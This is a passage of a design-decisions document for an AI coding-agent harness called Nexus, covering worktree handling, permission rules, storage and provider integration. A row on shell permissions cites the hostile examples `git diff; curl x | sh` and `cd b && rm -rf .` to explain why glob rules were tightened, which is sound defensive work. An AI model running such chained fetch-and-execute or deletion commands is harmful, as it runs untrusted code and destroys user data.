# Design decisions

## Schema 10 resets the session database instead of migrating (2026-10-24)

Nine forward-only migrations with Python backfills had become the riskiest code in
startup, and old sessions were not worth keeping working at that price. Schema 10 is a
reset version: an older database is backed up (online backup API, verified with
`quick_check` and the record count) and replaced by an empty one. The backup happens
first and the original is removed only after verification, so the worst case is an
error at startup, never lost sessions. An open handle on the old file (an old daemon)
is detected by asking SQLite for exclusive ownership and refuses the reset; the file
lock alone would not see a process that skips it. The notice is a host command so every
client gets it once. Backups are never pruned automatically. See [sessions.md](sessions.md).

## The agent manages its own worktrees; there are no modes (2026-10-24)

Plan: [agent-managed-worktrees](../plans/done/agent-managed-worktrees.md). This part is
the UI, host and config side; the runtime, tools, prompt and storage decisions are recorded
with their own changes. Status: the UI/host/config/view track is written but not yet run or
integrated with the runtime track.

- **No worktree modes and no question.** `none` / `ask` / `always`, the first-message
  "Create a worktree, or work in the main checkout?" modal, `/worktree`, the Settings ->
  Agents "Worktree mode" row, the draft "worktree selected" state, `[worktrees].sessions`,
  `[worktrees].checkpoints` and `worktree-mode.json` are removed with no compatibility path.
  A session starts in the main checkout and the first message is sent at once. Supersedes the
  ask-by-default choice and the first-message naming below.
- **Breaking host protocol (7).** `SessionWorktreeChoice` and `SessionWorktreeSet` are gone;
  `SessionWorktreeList` and `SessionWorktreeMove` are added. The user's idle commands
  `SessionPromote` and `SessionDetach` stay. A protocol-6 peer is refused.
- **The user can still override the agent**, idle-only, from `/worktrees` ("Move this session
  here", integrate, remove) without typing a sentence.
- **The top bar follows the view.** It is drawn from `ConversationView.root` (the latest
  `session.root_set`), not a host query, and redraws when the root changes, including an
  in-turn agent move.
- **Several worktrees in one history.** `WorktreeView` keeps the current worktree plus a bounded
  list of past ones (`merged` / `unmerged` / `removed`), and every create or move is a durable
  timeline row labelled with the stated `reason`. The old `checkpoint.*` and
  `session.worktree_set` events and their reducer code are deleted; old logs only produce
  diagnostics. The main checkout saves no turns, so turn diff/revert are offered only in
  worktrees.
- **Web** only loses its mode UI (it had none left to remove); it gains nothing (to be deprecated).

## Session worktrees are named by the user at the first message (2026-10-23) — superseded 2026-10-24

When a session goes into a worktree the user types a name at the first message.
That one name is the session title, the worktree folder and the branch
`nexus/session/<name>`, so the three can be recognised as the same thing; it is
validated up front and refused (not suffixed) when the branch or folder exists.
Without a name (noninteractive runs) the generated `<slug>-<token>` stays. The
agent is told its environment as a labelled block (worktree directory, main
checkout, branch, base branch, base commit) every turn, together with how to
finish: it lands its own work with plain Git (next entry); the user can also
land it through `/worktrees` (SessionIntegrate preview and confirm).

## Agents land their own session worktree with Git (2026-10-23)

Finishing means landing, and landing is plain Git, taught by the per-turn
environment block (there is deliberately no tool and no Nexus command). In the
worktree the agent commits everything, runs the checks, squashes onto the base
(`git reset --soft $(git merge-base HEAD <base>) && git commit -m ... -m ...`),
then fast-forwards the main checkout: `git -C <main checkout> merge --ff-only
<session branch>`. Why no bespoke command: Git already refuses a diverged base
(`--ff-only`; the agent runs `git merge <base>` in the worktree, rechecks,
squashes again, retries) and refuses to overwrite uncommitted files in the main
checkout (the agent stops and tells the user which). A first version,
a bespoke merge command (a host command, `commit-tree` squash, session-branch
`update-ref`), reimplemented those checks; it was removed. The rule "never edit
files or run other git write commands in the main checkout" stays; the
`--ff-only` merge is the single exception. Both the environment block and the
`/merge` instruction say outright that no Nexus CLI merge command exists or is
required, so an installed `nexus` without `merge` is never a reason to stop. The earlier session-name entry points
here for how a named worktree is landed.

The user always approves, with one narrow exception for the agent's own landing:
a shell command that runs a Git write subcommand (merge, commit, reset,
checkout, switch, rebase, ...) with `-C`, `--git-dir` or `--work-tree` options,
or after a `cd`, is a built-in forced ask in the permission engine
(`_is_git_write_elsewhere` in `tools/permissions.py`; every mode, despite allow
rules and grants; deny rules still win), so auto mode cannot skip it. The
exception is the parsed landing (`is_worktree_landing`): `git -C <main>
merge --ff-only <session branch>` and `git -C <main> checkout|switch <base>`,
also as told `&&` chains or `cd <main> && git …` spellings, never ask, because
`--ff-only` only moves the base forward to a commit that already contains it
(see [tools.md](tools.md#permissions-permissionspy)). The engine does not know the main
checkout path when no policy is installed, so without one the rule stays
conservative and a false positive only asks. Plain `git merge main` or `git
status` in the worktree is not forced. Not verified: behavior on an unattended
daemon with `on_unattended = "allow"`, which allows the command like any forced
ask.

The host notices the landing instead of being told: at turn end
(`SessionWorktrees.finish` -> `_landing`) it checks whether the session head has
commits beyond the recorded base commit and is now an ancestor of the target
branch head, and emits one durable `worktree.merged` event (plus the notice
"Merged into main @ sha") per landed session head. An unchanged fresh worktree
never fires. Detection runs at turn end, so the notice appears after the turn
that landed, not mid-turn. The `/worktrees` SessionIntegrate flow and its
relaxation (uncommitted target changes that do not overlap landed files are
allowed) are unchanged. The `/merge` chat command asks the agent to do the above.

## Subagent worktrees are disabled for now (2026-10-23)

Session worktrees are being reworked (a worktree with an automatic random
`<adjective>-<animal>` name at the first message, with the main and worktree
directories in the agent's environment).
Until that settles, subagents do not get their own worktrees: every child
shares the session checkout, the `subagent` schema hides `worktree`, and an
explicit `worktree: true` is refused. The runtime switch is
`SUBAGENT_WORKTREES` in `runtime.py`; the isolation code and its tests stay,
with the tests turning the switch on. Cost: parallel writer children can edit
the same files, as they could before isolation existed.

## Session roots retain project authority (2026-10-22)

Protocol v5 separates working directories from project identity. Each root is a
durable session fact; file/Git commands take a session selector, and native
sidebar/completion requests include it. Project configuration, extensions,
grants, memory and MCP stay anchored to the canonical project. Root-specific
AGENTS instructions are frozen per turn. Root selection authenticates both the
Git common directory and the reverse registration and holds the session lock.
The relative event path is a display/replay format, never an authority check.

User-created linked worktrees are external roots and are never automatically
committed or deleted. Owned-root creation and recovery are later phases.


Configured filesystem rules may match root-relative paths such as
`write(src/**)`. Canonical boundaries and configured denies are checked first;
absolute rules keep their absolute meaning. Exact file grants retain canonical
audit records, but replay uses the recorded root history to apply the same
relative file after that session changes roots. Shell/MCP grants and absolute
glob rules keep their original keys. Grants remain local to the session log;
this phase does not add a project-wide grant store or import other sessions'
approvals. Project settings and permission rules are shared independently.

## Shared daemon and canonical project identity (2026-10-22)

Choose one daemon per Nexus home + install, with per-project runtimes and a
mutable connection focus. Resolve Git subdirectories and linked worktrees to
the main checkout; keep submodules independent. Settings and grants belong to
the project. Keep full filesystem paths separate from display-truncated Git
breadcrumbs. This replaces per-workspace daemons and cross-project socket
reconnection. Protocol v5 rejects older clients; no compatibility escape hatch
or old-worktree-row migration is maintained. Environment capture is per project;
reload explicitly to change it.


What was chosen, what was refused, and why. Each entry points to the code or doc
that carries it. Add new decisions here, newest within a section last. Historical
detail lives in [`plans/`](../plans/); where a plan disagrees with current code,
this page and the code win.

## Product

| Decision | Why | Where |
| --- | --- | --- |
| **Context is presented clearly to the user and the agent.** Every parameter and output is shown, labelled and readable; never a raw JSON dump; nothing the agent sees is hidden from the user; clipping is announced. | This is the reason Nexus exists: trust comes from seeing the real request. | `ui_support/tool_details.py`, `context.py`, [surfaces.md](surfaces.md) |
| **The web mirrors the TUI.** Same regions, commands, shortcuts and wording; a change in one lands in the other. It may look more modern. | Users switch surfaces mid-task; muscle memory must transfer. | [surfaces.md](surfaces.md), [web.md](web.md) |
| **Browser-native finish, not "Signal".** Sans-serif text, Monaspace Argon for code, three radius tokens, soft shadows. The older 0-radius, hard-offset-shadow look is history (`design.md`). | The CSS mixed both looks; one consistent system was asked for. | `ui/web/styles/tokens.css` |
| **First run only asks to connect a provider**, then picks that provider's newest tool-calling model. | Minimum steps to a working chat; credentials never enter setup commands. | `host_support/setup.py` |
| **Skill, MCP and root-agent choices lock after a session's first turn.** | Changing the prompt prefix would invalidate the prompt cache and confuse the record. | `session/session.py:context_locked` |
| **Native tool/task rows omit failure badges and result gutters.** | The loop handles tool failures; expanded details and the agent page retain errors without adding noisy duplicate status marks to the transcript. | [surfaces.md](surfaces.md), `rust/tui/src/transcript.rs` |

The desktop copies the Ratatui design language: `theme.rs` derives its palette
from the TUI `Palette` (neutral greys, warm `#FAB283`/`#C8672F` brand accent,
semantic blue/purple/cyan/success/warning/error) and resolves host colour tokens
(`$nx-*`, agent hex) the way `transcript::color` does, so agent identity, thoughts,
tasks and context sources carry the same colours on both native surfaces. Native
type, curved controls and window chrome remain desktop-specific. Its composer
retains Ratatui's editor/controls/context ordering. Image previews are bounded
presentation data from the existing host; custom clients never read local image
paths themselves. See [desktop.md](desktop.md).

## Architecture

| Decision | Why | Where |
| --- | --- | --- |
| **One daemon per Nexus home/install owns project runtimes; every surface is a pure client** with no in-process fallback. | One place for locks, turns and approvals; surfaces can crash or disconnect without losing work. | [host.md](host.md) |
| **Session worktrees are project-level: one authenticated v4 record per worktree (`wt-<name>`, branch `nexus/wt/<name>`), shared by any number of sessions, with no owner, transfer or lock (2026-10-24).** Supersedes the per-session v3 record. `created_by` is display-only; validation checks project and lifecycle, never an owning session. Forks stay in the parent's root. No compatibility with v3 records or `nexus/session/` worktree branches: readers skip any record that is not v4 (a leftover one must not stop the daemon), and the old checkouts stay as plain Git worktrees. | Work that outlives one session (and several sessions in one checkout) needs a project resource. Membership is derived from each session's latest `session.root_set`, so it survives restart. `agents/session_worktrees.py`, [sessions.md](sessions.md#project-worktrees-storage-and-git) |
| **Commits use isolated-index `commit-tree` with compare-and-swap `update-ref`, take only the committing session's paths, and rebuild-and-retry a lost swap (≤ 4 attempts).** Hooks/signing cannot run during Nexus-created commits. | Pending records make creation/recovery explicit; only the worktree branch advances, other sessions' half-finished edits, unrelated staged files and the project checkout stay untouched. | `agents/session_worktrees.py`, [agents.md](agents.md#worktrees) |
| **Merged, clean checkouts are removed automatically when the last session leaves; the record and branch are always kept (2026-10-24).** Narrows "no automatic cleanup": unmerged, dirty or occupied checkouts are never removed automatically, and there is still no branch deletion or model-facing delete tool. | Stale checkouts pile up otherwise, and a kept branch plus record lets any session recreate it. `worktree_cleanup.auto_cleanup` | `worktree_cleanup.py`, [sessions.md](sessions.md#project-worktrees-storage-and-git) |
| **Root-session worktrees get an automatic random `<adjective>-<animal>` name; the TUI no longer asks for one (user decision, 2026-10-24).** Supersedes the mandatory naming step. The name is a folder/branch label only, never the session title or `title_source=user`. Explicit `exact_name` is unchanged; subagents keep `<slug>-<token>`. | Naming before the first message was friction. Allocation stays under the service lock: 32 word pairs, then 8 pairs with a 6-hex suffix, then the existing error. Only the root-session callers (`_create`, including forks, and `_promote`) opt in with `random_words`. | `agents/session_worktrees.py`, `worktree_sessions.py`, [sessions.md](sessions.md) |
| **`core/loop.py` knows only protocols.** | Testable with fakes; every manager replaceable; layering enforced by tests. | [loop.md](loop.md), `tests/test_layering.py` |
| **Events are the spine; views are pure reductions.** Every drawable state is an event, persisted before fan-out, with a monotonic per-session `seq`. | Replay reproduces live state; reconnect is "fold to `seq`, follow from `seq+1`"; SSE `Last-Event-ID` maps onto `seq`. | [events-and-view.md](events-and-view.md) |
| **`view/` sits below `model/`** and imports only `events`. | Daemon, CLI, browser and replay share one reducer. | `view/` |
| **A turn outlives its viewers**; scheduling never consults a subscriber count. | Closing a tab must never cancel work. | `host/supervisor.py` |
| **Global turn cap (4) with per-session FIFO and round-robin.** | "Five sessions × parallel tools × subagents is a fork bomb." | `host/supervisor.py` |
| **Per-turn freeze** of config, environment, `SOUL/MEMORY/AGENTS`, tool catalogue; one manifest generation per loop iteration. | Determinism and prompt-cache stability; a reload is visible next iteration/turn. | `runtime.py`, `context/manager.py` |
| **Tool-level failures are model-visible results; harness-level failures end the turn.** | The model can self-correct; the user sees real failures. | [loop.md](loop.md#failure-handling) |
| **Assistant message is persisted before any tool runs.** | No provider accepts a result without its call; crash recovery closes dangling calls without executing. | `core/loop.py` |
| **Recovery closes turns and `!` runs a stopped process left open** (`turn.failed`/`shell.completed`, reason `interrupted`). Turns: proven dead by the session lock. `!` runs hold no lock: closed only when not live in this process and the recorded `pid` is gone. | A replay must never show work as running that nothing runs. A `!` run gets no lock because it must not block turns. | `session/session.py` |
| **Whole-batch permission check before any tool runs.** | One approval covers several calls; a denial never leaves half a batch executed. | `core/loop.py` |
| **Fallback models only on a provider error that produced no output.** A refusal or partial stream never falls back; no mid-stream rerouting. | Avoid duplicated or inconsistent output. | `model/router.py`, `core/loop.py` |
| **Switching provider mid-session is allowed, lossy and visible** (`context.degraded`). | Flexibility without silent corruption. | `model/capabilities.py` |
| **Registry is authoritative for capabilities; adapters own transport-only fields.** A provider rejection contradicting the registry degrades once and records `registry.mismatch`. | One source of truth that can be fixed upstream; turns still complete. | `model/registry.py` |
| **Everything is bounded:** sizes, counts, pages, queues, timeouts. | Hostile or runaway input must not grow memory or stall the daemon. | throughout |

Simplified session integration (worktree-sessions/06) uses an explicit host preview
and a single-use confirmation, then a local fast-forward to the reviewed commit.
A dirty target checkout is accepted when none of its changed or untracked paths
overlap the landed files (Git's own `--ff-only` check stays as a second guard).
Diverged targets require normal Git resolution first. No queue, watcher, push or
automated merge strategy is introduced.

## Storage

| Decision | Why | Where |
| --- | --- | --- |
| **Sessions are append-only records in one shared SQLite DB** (`~/.nexus/nexus.db`, WAL, `synchronous=FULL`, `BEGIN IMMEDIATE`); JSONL is an export format only. Replaced per-project JSONL directories. | Indexed listing, cross-project state, race-free `seq` across daemons, one transaction for delete/archive. Legacy directories are not imported. | [sessions.md](sessions.md) (`plans/STATE_PLAN.md`) |
| **Per-turn history exists only in worktrees; main-checkout checkpoints are removed (2026-10-24).** Supersedes the hidden `refs/nexus/checkpoints` decision. Each worktree turn commit is also pinned under `refs/nexus/turns/<session>/<turn>` (newest 200 per session, deleted with the session) so its diff survives a squash and merge; revert of a squashed or cross-session-overlapped turn is refused, and a turn spanning two worktrees is not diffed. | Work worth undoing turn by turn belongs in a worktree; the main checkout is shared user state. Refs may be published by mirror pushes. | [sessions.md](sessions.md#per-turn-history-worktrees-only), `worktree_turns.py`, `agents/session_worktrees.py` (agent-managed-worktrees 3.5.1) |
| **Record bytes are unchanged msgspec JSON.** | Reducer, export, fork, replay untouched by the storage move. | `session/db.py` |
| **Snapshots are derived caches validated against the log; compaction never deletes history.** | Fast resume without risking loss; "omission from the prompt does not delete history". | `session/snapshot.py`, [context.md](context.md) |
| **Project extensions and settings live in `<workspace>/.agents/`; legacy `.nexus/` is a read-only lower-precedence fallback.** Machine state is under `~/.nexus/`. | A conventional, tool-neutral project dir; writes have one home. | [config.md](config.md) |
| **Config: layered, `msgspec`, unknown keys are errors; lists append; flat v1 bridges into v2.** | Typos must fail loudly; old configs keep working. | `config/` |
| **Secrets are references (`${env:…}`/credential store)**, resolved at use. | Nothing secret in config, logs or events; private credential storage is separate. | [security.md](security.md) |
| **Python ≥ 3.13.** | `object.__setattr__` on msgspec Structs, used across the codebase, fails on 3.12 and older. | `pyproject.toml` |

## Tools, permissions, extensions

| Decision | Why | Where |
| --- | --- | --- |
| **`deny` is absolute and daemon-side.** Order: deny → session grants → allow → ask → mode. | No grant, path trick or model argument may override it. | `tools/permissions.py` |
| **`*_always` persists an exact-action rule** (JSON-encoded key) or degrades to `*_once`; it never broadens. | A click must not silently authorise more than was shown. | `tools/permissions.py` |
| **Paths are canonicalised before any allow;** write roots and read-deny roots are hard boundaries; the state DB is never tool-accessible. | `../` and symlink escapes fail closed. | `PathGuard` |
| **No OS sandbox. Extensions are trusted code.** Quarantine validates; it does not sandbox. | A false sense of isolation is worse than a stated boundary. | [security.md](security.md) |
| **Two extension tiers:** data is parsed; code is imported under version-stamped module names, never `importlib.reload`. | An in-flight call keeps its generation; generations are immutable. | `tools/loader.py`, `ext/` |
| **Reload is all-or-nothing with one compare-and-swap.** | No partial manifests; a failed edit leaves the running world untouched. | `ext/manager.py` |
| **Not hot:** core modules, pip installs, manifest shape. | Widen an interface instead of making core reloadable. | `nexus doctor --explain-reload` |
| **`ToolContext` has no `Runtime`.** | A hot-loaded tool can be reviewed rather than trusted with the stack. | `tools/spec.py` |
| **Declarations are never grants** (skills, agents, hooks narrow only). No role is structurally read-only (see the read-only row below). | A markdown file must not expand authority. | `skills/activation.py`, `agents/model.py` |
| **Restricted frontmatter, no YAML dependency.** | Small attack surface; one bad line rejects the file. | `agents/model.py`, `skills/frontmatter.py` |
| **Tool names are lowercase; legacy names map one-way** and never widen rules. | Stable public vocabulary with compatibility for old rules. | `tools/names.py` |
| **Agent questions are data, not grants** (separate event group). | An answer must never be mistaken for an approval. | `events.py` |
| **A hook is policy, not a permission;** a `modify` is re-validated and re-gated. | Hooks cannot launder a denied call. | `hooks/` |
| **Blocked subagents report to the root, never to the user; the root escalates.** `escalate` exists only in a child's catalog, grants nothing and is allowed in every mode; the child's run then ends and the child goes idle: the root can continue it with `subagent_send` after resolving the block (see [agents.md](agents.md), "Reports and continuation"). A child never pauses mid-run waiting for an answer. | The root owns the conversation and the user; a human answer is the only thing that widens authority. | [agents.md](agents.md), `tools/builtin/escalate.py` |
| **Children never exceed parents:** tools intersect, permissions inherit, tier is clamped, depth/fan-out/spend bounded. | Delegation must not be an escalation path. | [agents.md](agents.md) |
| **Session mode and child `worktree` are independent.** Omitted child isolation defaults on for selected mutating tools in Git; explicit booleans override it. Successful isolated children save and return changes automatically; conflicts and failures retain their saved branch. Shared roots receive a checked working-file patch, preserving HEAD/index. | Simple turn saves and isolated workers without queues or role frontmatter. | `agents/session_subagents.py`, [agents.md](agents.md#worktrees) |
| **Only the root session spawns subagents (plan 07).** Enforced structurally by context, not by role name: a child runtime has no runner, `subagent` is removed from every child catalog (canonical `Task` alias included), and `spawn` refuses at depth ≥ 1. `agents.max_depth` above 1 is ignored; 0 disables spawning. Session-tree reads use a fixed depth of 8 so legacy nested logs still render. A name allowlist would strip user root roles and leave custom children a hole; opting a role back into nesting needs a new recorded decision. | One rule covers built-ins, user roles, worktree children, extensions and code mode. | [agents.md](agents.md), `agents/runner.py` |
| **Legacy subagent integration applies frozen bytes to a clean parent with a rollback journal; the user acknowledges an exact review.** Session worktrees instead commit only to authenticated Nexus-owned branches (above); subagent auto-merge and user-branch landing remain later worktree phases. | Existing child review stays recoverable while session history gains explicit turn commits. | `agents/worktree_*.py`, `agents/session_worktrees.py` |
| **MCP is wrapped once (`mcp/client.py`); its output is untrusted;** a tool is mutating unless `readOnlyHint` is explicitly true; a dead server never fails a turn. | Upstream churn stays in one file; fail-safe defaults. | `mcp/` |
| **Web tools are public-address-only with address pinning;** search results' links are never fetched. | SSRF and rebinding defence; injection surface reduction. | `net/` |
| **`shell` (formerly `bash`) yields long commands to background jobs** instead of killing them; `wait` returns on exit. | Long builds finish; the model stops polling. | [tools.md](tools.md#shell-jobs) |
| **The model-facing tool is `shell`; `bash`/`Bash` are exact, one-way aliases** for calls, tool lists, rules, stored grants, hook matchers and code mode, and wildcard rules keep matching through the old spellings. Old history is renamed only in the assembled request. | A stored `deny = ["b*"]` or `Bash(...)` rule must never silently stop applying. | [tools.md](tools.md), `tools/names.py` |
| **A glob allow rule never auto-allows a compound shell command; glob deny/ask rules see every segment.** Exact rules and grants are unchanged. | `shell(git diff*)` used to allow `git diff; curl x \| sh` and `shell(rm -rf*)` missed `cd b && rm -rf .`. Tightens, never widens. | [tools.md](tools.md#permissions-permissionspy), `tools/shell_syntax.py` |
| **Every shell job keeps one combined, arrival-ordered log file** (bounded and counted, never silent); the session cwd is a recorded value, not a long-lived shell process. | Large output is truncated in the conversation but never lost; no hidden shell state. | [tools.md](tools.md#shell-jobs), [plans/SHELL_PLAN.md](../plans/done/SHELL_PLAN.md) |

## Providers and models

| Decision | Why | Where |
| --- | --- | --- |
| **Any OpenAI-compatible vendor is a config block, not code** (and must state a `base_url`). | No silent default to `api.openai.com`. | `runtime.py:_adapter_kind` |
| **The models.dev catalogue supplies descriptions only,** never endpoints or credentials; vendored snapshot with MIT attribution; offline mode. | A third-party catalogue must not redirect requests. | `model/registry.py` |
| **Tiers resolve deterministically** (user pin → curated → cost → `low`) and only clamp downward. | Predictable routing and spend. | `model/tiers.py` |
| **Codex models go through the OpenAI adapter's Responses dialect** (ChatGPT OAuth, experimental, private endpoint), not a Codex CLI subprocess. | One adapter, refresh tokens in the private credential file only. | `auth/codex.py` |
| **GitHub Copilot uses GitHub.com device sign-in with OpenCode's OAuth app id;** the GitHub token is the Copilot bearer (no `copilot_internal` exchange). | Simple, verified against `/models`. The device flow itself was not live-tested. The root `README.md` still says Copilot is omitted; it predates this. | `auth/copilot.py` |
| **OpenCode is integrated over ACP only;** Nexus never reads its credential store; ACP tool calls stay inside that agent. | Clear trust boundary. | `model/providers/opencode.py` |
| **Claude subscription via the official Agent SDK in an isolated worker,** SDK tools/hooks/settings/persistence disabled; text-only, buffered. | Nexus keeps logging, permissions and execution. | `model/providers/claude_agent.py` |
| **Explicit `claude-code/<model>` subagents run Claude Code's own agent loop and tools in a PTY, outside Nexus's dispatcher; the earlier text-only PTY model bridge (`model/providers/claude_code.py`) was dropped and deleted.** | A bridge that disables Claude's tools and feeds JSON tool intentions into a Nexus child loop wastes what Claude Code is for and implies Nexus enforcement it cannot give an interactive CLI. Instead the policy is explicit and refuse-don't-widen (read-only roles only get `Read,Grep,Glob`; budgets refused; bypass/auto never passed; no prompt is ever answered), usage is reported as unknown, and file changes are measured by Nexus. Main-agent use stays on the SDK. Live behavior not verified; remaining gaps are listed in [agents.md](agents.md#external-claude-code-workers). | `agents/claude_code_worker.py`, `runtime.py:_ChildRuntime` |
| **`claude-code` subagents have a backend switch (`[models] claude_code_subagent_backend`: `worker` default, or `sdk`).** | Some users want Claude as a subagent under Nexus's tools, permissions and measured usage rather than Claude's own tools. `sdk` reuses the Agent SDK provider in the normal child loop, built per child so it never makes Claude a selectable main model. No silent default model on either backend. | `runtime.py:_ChildRuntime`, `host_support/model_settings.py` |
| **Antigravity (`kind = "antigravity"`, alias `agy`) is a subagent-only external worker, run headless over stream-json with agy's own tools; it defaults to `worker_inherits_agy_settings = true` (explicit `false` refuses execution) and refuses what Nexus cannot enforce.** | Same refuse-don't-widen rule as `claude-code`, but agy is driven over pipes (the Claude worker's earlier "ZMX" design used a PTY) so no terminal is emulated. A separate provider kind rather than extending `claude_code_subagent_backend`, which keeps Claude behaviour untouched and lets agy have no Nexus-tools backend. agy applies its own settings, MCP servers and plugins and PathGuard cannot reach it, so tool/MCP/restriction fields, worktrees and token/cost budgets are refused, and only `auto`/`accept-edits`/`plan` are passed. Models are the exact IDs `agy models` reports (no hard-coded catalogue); tiers may name `antigravity/<id>` explicitly, with no price ranking; never the root, title or fallback model. Usage is the terminal `result.usage` or `unknown`; cost is always `unknown`. Implemented offline only (no real model turn, no credentials). | `agents/antigravity_worker.py`, `model/providers/antigravity_cli.py`, `runtime.py:_plan_antigravity` |
| **Antigravity's permission bypass is an explicit, user-level opt-in (`worker_dangerously_skip_permissions`, default `false`).** | The user accepted agy's `--dangerously-skip-permissions`, but it auto-approves ALL tools outside PathGuard, so it is never default, never written into agy's own settings, rejected at load in project config layers (a cloned repo must not grant itself full authority), refused on other kinds, preflight-checked against `agy --help`, and disclosed in authority text, events, results and the UI. With it on, a configured `auto` mode is passed as the documented `accept-edits` (explicit `accept-edits`/`plan` stay). The Claude interactive worker (historical "ZMX") is not a substitute. | `agents/antigravity_worker.py`, `config/layers.py` |
| **Antigravity sign-in and quota are manual and honest.** | `agy` has no `auth` subcommand, so Nexus can prove only that the CLI exists, never that it is signed in; Settings says to run `agy`. Usage is shown as unavailable (no windows) with a note to run `/usage` in `agy`: its output format is unverified, so `agy -p /usage` is not run and no numbers are invented. | `host_support/provider_auth.py`, `host_support/provider_usage.py` |
| **"Read-only" is system-prompt guidance only; Nexus never enforces it on any role, child or provider (user decision, 2026-10-17).** | `READ_ONLY_ROLES` is empty, so `advisor` and the legacy `explore`/`plan`/`planner` keep the parent's tool ceiling (write, edit, patch and shell included) and their prompts say to avoid writing unless asked. Antigravity and Claude Code workers are planned with `read_only=False`: no refusal, no `--tools Read,Grep,Glob` restriction and no tier fallback for a "read-only" child; a Task call with `tools: []` is likewise ordinary. Earlier narrower fixes (empty tool list is not read-only) are superseded. Untouched on purpose: the `research` tool profile (a user-chosen profile that drops mutating tools, `tools/bundles.py`) and the gateway's `is_read_only` (HTTP idempotency). | `agents/model.py:READ_ONLY_ROLES`, `runtime.py:_plan_antigravity`, `agents/data/advisor.md` |
| **Sub-agent usage routing fails open, applies at spawn only, and touches sub-agents only.** | A broken or stale usage endpoint must never block delegation, so unknown usage counts as available. Switching a running child loses cache and reasoning state, so only the next sibling spawn routes around a spent quota; the main agent, title and compaction requests are never rerouted. If every candidate is blocked the first is used (a spawn never fails for quota) and the event says so. The route is chosen in the runner at spawn and pinned as a concrete reference; the router itself stays usage-free. | `model/usage_gate.py`, `runtime.py:route_subagent`, `agents/runner.py`, `host_support/usage_snapshot.py` |
| **Provider usage reuses the credentials Nexus already holds;** Claude's comes from `claude -p /usage`, not the `api/oauth/usage` endpoint CodexBar calls. | Reading Claude Code's OAuth token from its keychain item would break "the CLI owns the credential store"; `/usage` is a local command that costs no tokens. Its text format is unversioned, so a CLI change shows as a row error rather than wrong numbers. | `host_support/provider_usage.py` |
| **Claude sign-in runs `claude auth login` headless and takes a pasted code;** Settings never signs Claude out. | The daemon never opens a browser, and the login is shared with Claude Code, so a Nexus "Disconnect" would surprise the user. | `host_support/provider_auth.py` |
| **`Ctrl+U` opens usage even in the composer.** | One direct key in both surfaces; the TUI composer loses readline's delete-to-line-start (`Cmd+Backspace` still works). | `ui/ratatui/actions.py` |
| **Thinking summaries are provider-supplied and never invented;** no duration is fabricated. | Honest presentation. | [loop.md](loop.md#thinking) |
| **Voice runs Underdog Bark 3.0 Clean (a Parakeet TDT fine-tune) on stock Transformers; the `.bark` file is parsed as bounded data, never code.** Pinned sizes and SHA-256, no `trust_remote_code`, no pickle, no NVIDIA weights. Model download is consent-gated and never implicit. | Privacy and supply-chain safety; replaces the Kestrel runtime (telemetry, no opt-out). Real inference is unverified. | [voice.md](voice.md) |
| **Live dictation re-transcribes the growing recording as non-queueing `partial` previews; the final transcript still comes from one pass over the whole recording.** | Parakeet TDT here is offline, not streaming; whole-recording passes avoid word-boundary seams between chunks, and previews can never delay or replace the final text. Cost grows with length, bounded by `max_seconds`. | [voice.md](voice.md#flow) |

## Web

| Decision | Why | Where |
| --- | --- | --- |
| **Plain HTML/CSS/ES modules, no build step, no framework.** | Served from the wheel; edits visible on reload. | `ui/web/` |
| **Strict CSP:** no inline script or `style=""`, no external hosts (font is vendored). | Untrusted text must not execute. | `host/web.py` |
| **One-use ticket → `HttpOnly; SameSite=Strict` cookie + CSRF; exact `Origin`.** | A local listener still must defend against other pages. | `host/web.py` |
| **Browser state comes from a versioned snapshot plus JSON-Pointer patches with `resync`.** | Cheap live updates, safe reconnects. | `host_support/browser_view.py` |

## Process

| Decision | Why | Where |
| --- | --- | --- |
| **No line caps;** new terminal behavior still gets its own module. | Caps produced contortions; layering is what matters. | `tests/test_phase3_exit.py` |
| **Conventional Commits drive versions; never edit `version` or `CHANGELOG.md` by hand.** A version-bump request defaults to the next patch and authorises the full release; a minor bump needs explicit approval. | release-please owns the files; patch releases should be cheap. | [release.md](release.md) |
| **Docs are the source of truth; code wins over plans.** | Agents need one place to look. | [README.md](README.md) |

## mcp.json reads other clients' dialects (2026-10)

People paste MCP config from VS Code, Claude Code, Cursor or OpenCode; refusing
`type`, an argv `command` or `${VAR}` made those servers vanish silently. Each
entry is now folded into Nexus keys first, foreign approval/OAuth keys are
accepted but shown as ignored (never acted on), any other unknown key still fails
that one server, and failures are rows in Settings and the context header. `${VAR}`
now expands like Claude Code (it used to be literal); bare `$VAR` stays literal.
Each file is isolated, so a broken project file no longer freezes the global set.

## Waiting messages: promote, never demote; restore only steering

A pending message can be promoted (`queue → steer → interrupt`) through a durable
`input.mode_changed`, never demoted, so a steer that may already be influencing the user's
expectations is not silently pushed back. Only queued items are reordered by the native
client. Cancelling a **steering** message returns its full text to an empty composer;
queued messages are removed without restoring, because only steering was asked for. The
draft is never overwritten: a non-empty draft stays and a toast names the removed message.
The gateway does not expose `SessionQueueSetMode` (its allow-list is a reviewed set).
Attachments of a removed steering message are re-prepared (the host keeps no copy of the
prepared bytes) and attached only when the draft has none; the rest of the restore is
all-or-nothing in Rust, which asks the bridge to drop them again when it declines.
Keyboard focus on the list follows the transcript's focus keys (Tab/Down/Up) rather than a new
chord; Enter/`s` promote, Delete/Backspace/`x` remove and Alt+Up/Down reorder because those
keys have no meaning on a focused row and no existing binding applies there.

## Skills from `npx skills`: stage, then import (2026-10)

`npx skills add` only runs in a throwaway directory with `--copy`; Nexus validates and copies
the result into `.agents/skills/` or `~/.nexus/skills/` itself. `~/.nexus/skills` is not a folder
`npx skills -g` knows, its default symlinks would be refused by the resource resolver, and
staging keeps the destination, path policy, conflicts and trash ours. Not a model tool, not
reachable by paired devices, and the strict frontmatter parser is not loosened for public skills.

## Another project's session that fails to open is a toast, not silence

`switch_project` shows `Could not open the session in <workspace>: <reason>` (an error toast;
the reason is `host_support.errors.error_text`: redacted, one line, never empty, so a
`TimeoutError()` names its type) and keeps the Sessions dashboard open on the old session; the
dashboard closes only when the switch succeeded (`switch` hides it). The failure mode was a
daemon that would not start for the other workspace (a stale install raising `ConfigError`, or a
startup timeout whose exception has no message): the generic handler flashed `str(exc)`, which
is empty for the latter, and `toast` drops empty text.

## Animations off and Monochrome

`cache.animate == false` draws the final state of every overhaul animation immediately, and the
frame clock may not change a single cell (`render::animations_off_tests` draws a busy screen at
two ticks and compares): spinners rest on their first frame, the activity meter's working fifth
rests in the middle, the voice preview is not scrambled, folds, the queue flash,
notification pop and drawer, the live strip and the splash take their end state. Monochrome drops
every colour but keeps modifiers, so each state needs a shape: the
activity meter's lit cells become `━` (`=`), the selected Sessions row gets the focus bar, a
